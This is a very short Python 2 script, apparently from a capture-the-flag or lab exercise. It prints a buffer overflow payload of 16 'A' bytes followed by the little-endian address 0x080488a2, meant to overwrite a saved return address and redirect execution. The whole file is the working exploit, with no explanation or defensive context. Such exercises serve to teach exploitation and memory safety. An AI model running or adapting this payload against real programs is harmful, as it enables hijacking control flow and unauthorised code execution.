from struct import pack

address = pack ("<I", 0x080488a2)

print 'A' * 16 + address
